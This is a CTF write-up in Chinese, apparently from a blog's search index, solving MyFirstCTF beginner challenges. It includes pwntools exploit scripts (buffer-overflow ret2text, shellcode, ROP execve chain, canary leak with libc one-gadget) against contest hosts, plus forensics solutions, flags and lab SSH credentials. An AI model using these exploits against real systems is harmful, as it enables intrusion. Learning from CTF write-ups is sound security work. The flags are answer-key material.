<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>MyFirstCTF Online</title>
      <link href="/zh-tw/myfirstctf-online/"/>
      <content type="html"><![CDATA[<h1 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h1><h2 id="Soeasy"><a href="#Soeasy" class="headerlink" title="Soeasy"></a>Soeasy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一堂逆向工程課</span><br><span class="line">課堂老師出了一題簡單的程式要比對輸入的資料是否滿足某條件，聰明的你應該很快就解出答案。</span><br><span class="line"></span><br><span class="line">https://bit.ly/2GM36Fa</span><br></pre></td></tr></table></figure><p>從檔案名稱可以看出題目要考簡單的逆向工程，<br>比較快速的解法是直接下 strings 查看可印出的字符串，再利用 grep 快速搜尋 FLAG 關鍵字</p><p><img src="https://i.imgur.com/tXhTnmG.png" alt=""></p><p>其實也可以用 IDAPro 看偽代碼，可以發現程式執行不管輸入什麼字都不會印出 FLAG。</p><p><img src="https://i.imgur.com/xxjF970.png" alt=""></p><h3 id="MyFirstObfuscatedCode"><a href="#MyFirstObfuscatedCode" class="headerlink" title="MyFirstObfuscatedCode"></a>MyFirstObfuscatedCode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">日本風格的javascript變裝術</span><br><span class="line"></span><br><span class="line">軟體保護技術中,代碼混淆是一種常見的技術。</span><br><span class="line">wikipedia上說明&quot;代碼混淆是將電腦程式的代碼，轉換成一種功能上等價，但是難於閱讀和理解的形式的行為&quot;。</span><br><span class="line"></span><br><span class="line">這是你的第一堂代碼混淆課,請嘗試解出附件。</span><br><span class="line"></span><br><span class="line">提示1: 開始了解代碼混淆,請看維基百科的說明 :</span><br><span class="line">https://zh.Wikipedia.org/zh-tw/代碼混淆</span><br><span class="line">提示2: &quot;功能上等價&quot;就是可以執行,答案會和原始程式執行所得到的答案一樣。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://bit.ly/2GpFvqA</span><br></pre></td></tr></table></figure><p>稍微 Google 一下關鍵字 <code>javascript 混淆 顏文字</code>，應該就會知道這是 aaencode，所以丟 aaencode Decoder 就可以解出來了。</p><p>另外一種比較常見的混淆還有 jsfuck ，曾被當作 <a href="https://www.30cm.tw/2015/08/ctf-ais3-write-up.html" target="_blank" rel="noopener">AIS3-2015-Web2</a> 的考題。</p><p>更多關於 JavaScript 混淆的資訊請 <a href="https://blog.techbridge.cc/2016/07/16/javascript-jsfuck-and-aaencode/" target="_blank" rel="noopener">點我</a></p><h2 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h2><p>想辦法 parse 題目成這種格式：<code>a + b</code><br>之後使用 python 的 eval 就可以直接算出答案了</p><h2 id="Return"><a href="#Return" class="headerlink" title="Return"></a>Return</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">控制暫存器rip等同控制世界!</span><br><span class="line"></span><br><span class="line">提示1 : 經典的buffer overflow漏洞</span><br><span class="line">提示2 : 你可透過劫持當下function的return address來控制程式執行指針至目標位置。</span><br><span class="line"></span><br><span class="line">nc 140.110.112.29 2114</span><br><span class="line"></span><br><span class="line">https://bit.ly/2GrDkmq</span><br></pre></td></tr></table></figure><p>簡單的 ret2text ，透過 Stack overflow 蓋掉 gets() 的 Return Address，並將指令指針(RIP)指向 you_cant_see_this_its_too_evil()，並且成功 getshell。</p><p>直接上 exploit：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"140.110.112.29"</span></span><br><span class="line">port = <span class="number">2114</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">56</span></span><br><span class="line">evil = <span class="number">0x00000000004006b6</span></span><br><span class="line"></span><br><span class="line">r = remote(host, port)</span><br><span class="line">r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(padding) + p64(evil)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># cat /home/reutrn/flag</span></span><br></pre></td></tr></table></figure><p>更多 ret2text 的學習資源請 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop/#ret2text" target="_blank" rel="noopener">點我</a></p><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">厲害的駭客都擅長shellcoding</span><br><span class="line"></span><br><span class="line">提示1:題目將輸入直接當machine code執行</span><br><span class="line">提示2:撰寫組語，以及提交正確功能的shellcode。</span><br><span class="line"></span><br><span class="line">nc 140.110.112.29 2115</span><br><span class="line"></span><br><span class="line">https://bit.ly/2Gtc1Ix</span><br></pre></td></tr></table></figure><ul><li>有 memory leak (input buffer address)</li><li>沒開 NX 保護</li><li>有 RWX Segment</li></ul><p>所以我們要將可以拿到 shell 的 Shellcode 透過一開始的 gets() 放進我們已知記憶體位置的 input buffer，在利用前面所學到的 ret2text 的技巧，蓋掉 gets() 的 return address，讓 RIP 指到 input buffer。</p><p>具體 exploit 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"140.110.112.29"</span></span><br><span class="line">port = <span class="number">2115</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">r = remote(host, port)</span><br><span class="line">padding = <span class="number">120</span></span><br><span class="line"></span><br><span class="line">input_buf = int(r.readline().split(<span class="string">" "</span>)[<span class="number">6</span>], <span class="number">16</span>) <span class="comment"># 將 buf 位置抓回來</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.amd64.linux.sh())</span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(padding, <span class="string">"A"</span>) + p64(input_buf)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment"># cat /home/shellcodde/flag</span></span><br></pre></td></tr></table></figure><p>由於 NX 保護沒開，所以 input buffer 具有可執行權限，導致我們可以成功 Getshell。</p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>原本只以為是基本的 ROP ，後來用 gdb 追才發現先有一個 <code>strlen</code> 檢查輸入<br><img src="https://i.imgur.com/Ihctekk.png" alt=""><br>後來 google 了一下，發現 <code>\x00</code> 可以直接繞過 <code>strlen</code> ，後面的解法就很正常了</p><p>Exploit:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'0.0.0.0'</span>, <span class="number">8888</span>)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">29</span> + <span class="string">'\x00'</span> + <span class="string">'a'</span>*<span class="number">10</span></span><br><span class="line"></span><br><span class="line">mov_rdi_rsi = <span class="number">0x47a712</span></span><br><span class="line">pop_rsi = <span class="number">0x401617</span></span><br><span class="line">pop_rdi = <span class="number">0x4014f6</span></span><br><span class="line">pop_rax_rdx_rbx = <span class="number">0x478726</span></span><br><span class="line">buf = <span class="number">0x6ca080</span></span><br><span class="line">syscall = <span class="number">0x4673c5</span></span><br><span class="line"></span><br><span class="line">payload1 = flat([pop_rdi, buf, pop_rsi, <span class="string">'/bin/sh\x00'</span>, mov_rdi_rsi, pop_rsi, <span class="number">0</span>, pop_rax_rdx_rbx, <span class="number">0x3b</span>, <span class="number">0</span>, <span class="number">0</span>, syscall])</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#raw_input('##############')</span></span><br><span class="line">r.sendline(payload + payload1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="memo-manager"><a href="#memo-manager" class="headerlink" title="memo_manager"></a>memo_manager</h2><p>先上 Exploit:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(data)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    r.send(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'What do you want to say:'</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line">    r.recvuntil(<span class="string">'You said: '</span>)</span><br><span class="line">    <span class="keyword">return</span> r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">store</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    r.send(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Which one do you want to store in (1 , 2 , 3)?:'</span>)</span><br><span class="line">    r.send(str(index))</span><br><span class="line">    r.recvuntil(<span class="string">"What do you want to store in mem page %d :"</span> %index)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    r.send(<span class="string">'3'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Which memo page do you want to see (1 , 2 , 3)?:'</span>)</span><br><span class="line">    r.send(str(index))</span><br><span class="line">    r.recvuntil(<span class="string">'memo page %d : '</span> %index)</span><br><span class="line">    <span class="keyword">return</span> r.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    r.send(<span class="string">'4'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Which memo page do you want to edit (1 , 2 , 3)?:'</span>)</span><br><span class="line">    r.send(str(index))</span><br><span class="line">    r.recvuntil(<span class="string">'Edit memo page 4 :'</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'ctf.racterub.me'</span>, <span class="number">3008</span>)</span><br><span class="line"></span><br><span class="line">atoi_off = <span class="number">0x36e80</span></span><br><span class="line">tmp = echo(<span class="string">"a"</span>\*<span class="number">0x48</span>).strip()+<span class="string">"\\x00"</span>\*<span class="number">8</span></span><br><span class="line">atoi = u64(tmp\[<span class="number">0x48</span>:<span class="number">0x50</span>\])<span class="number">-16</span></span><br><span class="line">libc = atoi - atoi_off</span><br><span class="line">gadget = libc + <span class="number">0x45216</span></span><br><span class="line">log.info(<span class="string">"atoi: &#123;&#125;"</span>.format(hex(atoi)))</span><br><span class="line">log.info(<span class="string">"libc: &#123;&#125;"</span>.format(hex(libc)))</span><br><span class="line">log.info(<span class="string">"gadget: &#123;&#125;"</span>.format(hex(gadget)))</span><br><span class="line"></span><br><span class="line">store(<span class="number">1</span>, <span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">store(<span class="number">2</span>, <span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">store(<span class="number">3</span>, <span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">"a"</span>*<span class="number">0x19</span>)</span><br><span class="line">tmp = <span class="string">"\\x00"</span>+show(<span class="number">3</span>)\[<span class="number">0x19</span>:<span class="number">0x19</span>+<span class="number">7</span>\]</span><br><span class="line">canary = u64(tmp)</span><br><span class="line">log.info(<span class="string">"canary: &#123;&#125;"</span>.format(hex(canary)))</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">"a"</span>*<span class="number">0x10</span>+<span class="string">"\\x00"</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">"a"</span>*<span class="number">0x18</span>+p64(canary)+p64(canary)+p64(gadget))</span><br><span class="line">r.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">r.send(<span class="string">'5'</span>)</span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ASCII(American Standard Code for Information Interchange)全名為美國資訊交換標準代碼，是基於拉丁字母的電腦編碼，前期主要用於表示現代英文，擴展版本後甚至支援其他部分西歐語言。</span><br><span class="line"></span><br><span class="line">最著名的就是Ascii Table，請對照Ascii Table解碼下列十進位資料:</span><br><span class="line"></span><br><span class="line">77 121 70 105 114 115 116 67 84 70 123 90 50 79 97 115 54 55 65 69 54 68 117 65 51 73 50 112 56 69 53 125</span><br></pre></td></tr></table></figure><p>丟 ASCII Decoder 秒解。<br>請愛用：<a href="https://www.asciitohex.com/" target="_blank" rel="noopener">https://www.asciitohex.com/</a></p><h2 id="Secrets-in-PDF"><a href="#Secrets-in-PDF" class="headerlink" title="Secrets in PDF"></a>Secrets in PDF</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一線資安工程師在攻擊事件現場蒐集到犯罪所遺留的文件，身為鑑識專家的你請協助我們完成找出隱藏在資料裡的資料。</span><br><span class="line"></span><br><span class="line">https://bit.ly/2GpIcbG</span><br></pre></td></tr></table></figure><p>真的是有夠87的一題XDDD<br>直接下載下來，然後用滑鼠反白整張 PDF 就好了。(在網頁版上開 PDF 反白可能沒效喔)</p><p>害我想這麼久，真正的第一線資安工程師不會搞這麼無聊的東西好嗎XDDD</p><h2 id="Secret-of-Metadata"><a href="#Secret-of-Metadata" class="headerlink" title="Secret of Metadata"></a>Secret of Metadata</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">這是一張可疑圖片，身為鑑識專家的你請協助我們完成者找出隱藏在圖片裡的資料。</span><br><span class="line"></span><br><span class="line">https://bit.ly/2Go1CBM</span><br></pre></td></tr></table></figure><p>用 <a href="http://www.caesum.com/handbook/Stegsolve.jar" target="_blank" rel="noopener">StegoSolve</a> 打開圖片，Analyse -&gt; File Format 慢慢翻，會找到 MyFirstCTF 字樣，<br>我記得 FLAG 在中間，FLAG沒有空白。</p><p><code>另解：Exiftool 可直接找到 flag</code></p><h2 id="Secret-images-in-pictures"><a href="#Secret-images-in-pictures" class="headerlink" title="Secret images in pictures"></a>Secret images in pictures</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">另一張可疑圖片。</span><br><span class="line"></span><br><span class="line">身為鑑識專家的你，發現圖片大小異常，很可能還藏著另一張圖片，請協助我們完成者找出隱藏在圖片裡的圖片。</span><br><span class="line"></span><br><span class="line">提示1 : 你如何知道圖片藏有圖片??  </span><br><span class="line">提示2 : dd是一個linux平台上好用的工具，可以幫助你解題。</span><br><span class="line"></span><br><span class="line">https://bit.ly/2EaSFFR</span><br></pre></td></tr></table></figure><p>binwalk + dd 老梗了，直接上 ShellScript 吧<br><code>dd if=Secret_pic.png of=flag.png bs=1 skip=1364137</code><br>詳解請 <a href="https://ctf-wiki.github.io/ctf-wiki/misc/prefix/#binwalk" target="_blank" rel="noopener">點我</a></p><h2 id="Sniffering"><a href="#Sniffering" class="headerlink" title="Sniffering"></a>Sniffering</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Insecurity 銀行的遠端連線伺服器發現遭受到駭客植入木馬，銀行的資安人員通知MyFirstSecurity資安技術服務工程師到場進行蒐證。</span><br><span class="line">MyFirstSecurity資安技術服務工程師在現場收集網路封包後，建議Insecurity銀行採用安全的遠端連線。</span><br><span class="line"></span><br><span class="line">請你找出網路封包中的flag。</span><br><span class="line"></span><br><span class="line">提示1: 遠端連線使用的協定中使用明文傳輸容易遭致網路竊聽</span><br><span class="line"></span><br><span class="line">https://bit.ly/2GZmg8h</span><br></pre></td></tr></table></figure><p>開啟 wireshark，打開 Broken_session.pcap<br>對其中一條 TCP 傳輸按滑鼠右鍵， folllow -&gt; TCP stream ，就可以看到FLAG。</p><p><img src="https://i.imgur.com/dFyb1WB.png" alt=""></p><h2 id="Linux-hidden-file-linux-1"><a href="#Linux-hidden-file-linux-1" class="headerlink" title="Linux-hidden file (linux-1)"></a>Linux-hidden file (linux-1)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">資安鑑識人員偵查一台伺服器，發現在/home/lab目錄有重要資料被隱藏，使鑑識人員搜查情資不易，你能夠連至這台伺服器幫忙尋找嗎?</span><br><span class="line"></span><br><span class="line">SSH 資訊</span><br><span class="line">IP : 140.110.112.29</span><br><span class="line">Port: 2200</span><br><span class="line"></span><br><span class="line">帳號 : lab</span><br><span class="line">密碼 : lab</span><br></pre></td></tr></table></figure><p>考你會不會使用 ssh 、怎麼找出隱藏的檔案，在 Linux 中，隱藏的檔案的檔名前面都會有個 “.”</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> howpwn@nb ~/WriteUp  ssh lab@140.110.112.29 -p 2200</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lab@140.110.112.29's password:</span><br><span class="line">lab@b45a8fa24aa9:~$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 1 root root 4096 Apr  1 04:31 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Mar 23 00:46 ..</span><br><span class="line">-rw-r--r-- 1 lab  lab   220 Mar 23 00:46 .bash_logout</span><br><span class="line">-rw-r--r-- 1 lab  lab  3771 Mar 23 00:46 .bashrc</span><br><span class="line">-rw-rw-r-- 1 root root   33 Mar 26 11:32 .hidden_secret</span><br><span class="line">-rw-r--r-- 1 lab  lab   655 Mar 23 00:46 .profile</span><br><span class="line">lab@b45a8fa24aa9:~$ cat .hidden_secret</span><br><span class="line">MyFirstCTF&#123;aowMaSNSRgUvkp6Ehb6R&#125;</span><br></pre></td></tr></table></figure><h2 id="Linux-find-file-linux-2"><a href="#Linux-find-file-linux-2" class="headerlink" title="Linux-find file (linux- 2)"></a>Linux-find file (linux- 2)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">檢察官終於使嫌犯說出帳密及他把重要的secret檔案放在遠端伺服器，但卻忘了檔案位置，身為資安鑑識人員的你能夠連線至該伺服器，幫忙偵蒐嗎?</span><br><span class="line"></span><br><span class="line">SSH伺服器資訊</span><br><span class="line">IP : 140.110.112.29</span><br><span class="line">Port: 2200</span><br><span class="line"></span><br><span class="line">帳號 : lab</span><br><span class="line">密碼 : lab</span><br></pre></td></tr></table></figure><p>這次就是考你怎麼 find 檔案了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">lab@b45a8fa24aa9:~$ find / -name "secret" # 從根目錄底下開始搜尋 secret</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">/opt/secret</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">lab@b45a8fa24aa9:~$ cat /opt/secret</span><br><span class="line">MyFirstCTF&#123;baLc2hpIssVsU7p5boud&#125;</span><br></pre></td></tr></table></figure><h2 id="InSecureDataTransfer"><a href="#InSecureDataTransfer" class="headerlink" title="InSecureDataTransfer"></a>InSecureDataTransfer</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MyFirstSecurity資安工程師在攻擊事件現場側錄到遺留有犯罪的可疑封包。</span><br><span class="line">身為鑑識專家的你請協助我們完成者找出隱藏在資料的秘密。</span><br><span class="line"></span><br><span class="line">提示1 : Wireshark 可以幫助你</span><br><span class="line"></span><br><span class="line">https://bit.ly/2GtMm2h</span><br><span class="line">`</span><br></pre></td></tr></table></figure><p>在觀察一下之後發現是 FTP 傳檔過程<br>追蹤一下就可以發現有傳送一個檔 <code>secret.txt</code><br><img src="https://i.imgur.com/NmLnHGK.png" alt=""></p><p><code>另解 1</code><br><code>strings File_transfer.pcap | grep &quot;CTF&quot;</code></p><p><code>另解 2</code><br>在 wireshark 搜尋欄打上 <code>tcp contains CTF</code><br><img src="https://i.imgur.com/dWgNrtF.png" alt=""></p><h2 id="calculator-ppc-1"><a href="#calculator-ppc-1" class="headerlink" title="calculator (ppc-1)"></a>calculator (ppc-1)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">你能幫我解一些方程式嗎？</span><br><span class="line"></span><br><span class="line">nc 140.110.112.29 5119</span><br><span class="line"></span><br><span class="line">(連線範例在 https://bit.ly/2IiTLBT )</span><br></pre></td></tr></table></figure><p>利用 Pwntools 很好解，直接上 Script：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"140.110.112.29"</span></span><br><span class="line">port = <span class="number">5119</span></span><br><span class="line"></span><br><span class="line">r = remote(host, port)</span><br><span class="line"></span><br><span class="line">r.readline() <span class="comment"># ===== Welcome to the magic calculator =====</span></span><br><span class="line">r.readline() <span class="comment"># We got some equations here, but the operator is missing.</span></span><br><span class="line">r.readline() <span class="comment"># Can you help us?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    r.readline() <span class="comment"># ----- wave 1/100 -----</span></span><br><span class="line">    Formula = r.readline()</span><br><span class="line">    <span class="comment"># 開始分別抓取元素 (Formula是字串型態，加上 int 轉成數字型態)</span></span><br><span class="line">    First_element = int(Formula.split(<span class="string">' '</span>)[<span class="number">0</span>])</span><br><span class="line">    Second_element = int(Formula.split(<span class="string">' '</span>)[<span class="number">2</span>])</span><br><span class="line">    Result = int(Formula.split(<span class="string">' '</span>)[<span class="number">4</span>])</span><br><span class="line">    <span class="comment"># 開始進行比對，並且找出正確的運算子</span></span><br><span class="line">    <span class="keyword">if</span> First_element + Second_element == Result:</span><br><span class="line">        r.sendline(<span class="string">"+"</span>)</span><br><span class="line">    <span class="keyword">elif</span> First_element - Second_element == Result:</span><br><span class="line">        r.sendline(<span class="string">"-"</span>)</span><br><span class="line">    <span class="keyword">elif</span> First_element * Second_element == Result:</span><br><span class="line">        r.sendline(<span class="string">"*"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><h1 id="Web"><a href="#Web" class="headerlink" 